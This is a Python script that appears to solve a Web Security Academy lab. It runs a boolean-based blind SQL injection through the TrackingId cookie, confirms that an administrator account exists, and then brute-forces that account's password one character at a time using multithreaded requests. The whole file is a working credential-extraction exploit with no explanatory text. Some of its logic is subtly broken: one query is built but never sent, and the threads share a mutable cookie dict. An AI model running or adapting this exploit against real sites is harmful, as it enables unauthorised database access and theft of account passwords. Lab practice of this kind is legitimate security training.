import requests
import difflib
import string
from tqdm import tqdm
import concurrent.futures

# Define the base URL
url = 'https://0a37000d043b414a808fd6f500eb0038.web-security-academy.net'

# Start a session
with requests.Session() as s:
    # Initial request to get cookies
    r = s.get(url)
    
    # Extract the cookies
    tracking_id = ''
    session_id = ''
    for cookie in r.cookies:
        if cookie.name == 'TrackingId':
            tracking_id = cookie.value
        elif cookie.name == 'session':
            session_id = cookie.value

    # Debug: Print the initial cookies
    print(f'Initial TrackingId: {tracking_id}')
    print(f'Initial session: {session_id}')

    # Define the queries
    query1 = "' AND '1'='1"
    query2 = "' AND '1'='2"
    
    # Setup cookies with the first query
    cookies = {
        'TrackingId': tracking_id + query1,
        'session': session_id
    }
    response1 = s.get(url, cookies=cookies)
    content1 = response1.text
    
    # Setup cookies with the second query
    cookies['TrackingId'] = tracking_id + query2
    response2 = s.get(url, cookies=cookies)
    content2 = response2.text
    
    # Debug: Ensure responses are fetched
    print(f'Response 1 Status Code: {response1.status_code}')
    print(f'Response 2 Status Code: {response2.status_code}')

    # Compare the content using difflib
    diff = difflib.unified_diff(
        content1.splitlines(keepends=True),
        content2.splitlines(keepends=True),
        fromfile='response1',
        tofile='response2',
    )
    
    # Print the differences
    for line in diff:
        print(line, end='')

    # Check users table
    query3 = "' AND (SELECT 'a' FROM users LIMIT 1)='a"
    cookies['TrackingId'] = tracking_id+query3
    response3 = s.get(url=url, cookies=cookies)
    content3 = response3.text
    # print(response3.status_code)

    # Compare the content using difflib
    diff = difflib.unified_diff(
        content2.splitlines(keepends=True),
        content3.splitlines(keepends=True),
        fromfile='response2',
        tofile='response3',
    )
    
    # Print the differences
    for line in diff:
        print(line, end='')

    query4 = " AND (SELECT 'a' FROM users where username='administrator')='a"
    cookies['TrackingId'] = tracking_id+query3
    response4 = s.get(url=url, cookies=cookies)
    content4 = response4.text
    # print(response3.status_code)

    # Better way
    print(f'adminstrator exist: {content1==content4}')
    
    if content1==content4:
        password_length = 0
        for length in range(1,30):
            query5 = f"' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>{length})='a"
            cookies['TrackingId'] = tracking_id+query5
            response5 = s.get(url=url, cookies=cookies)
            content5 = response5.text
            # verify length
            if content1 != content5:
                password_length = length
                print(f'administrator password length : {length}')
                break
    
    # if password_length:
    # password_length = 19
    password = ''
    def check_letter(position, letter, initial_content):
        substring_query = f"' AND (SELECT SUBSTRING(password,{position},1) FROM users WHERE username='administrator')='{letter}"
        cookies['TrackingId'] = tracking_id + substring_query
        response = s.get(url=url, cookies=cookies)
        content = response.text
        return content == initial_content, letter
    
    for position in tqdm(range(1, password_length + 1)):
        with concurrent.futures.ThreadPoolExecutor(max_workers=35) as executor:
            characters_to_check = string.ascii_lowercase + string.digits
            futures = {executor.submit(check_letter, position, letter, content1): letter for letter in characters_to_check}
            for future in concurrent.futures.as_completed(futures):
                match, letter = future.result()
                if match:
                    print(letter)
                    password += letter
                    break

    print(password)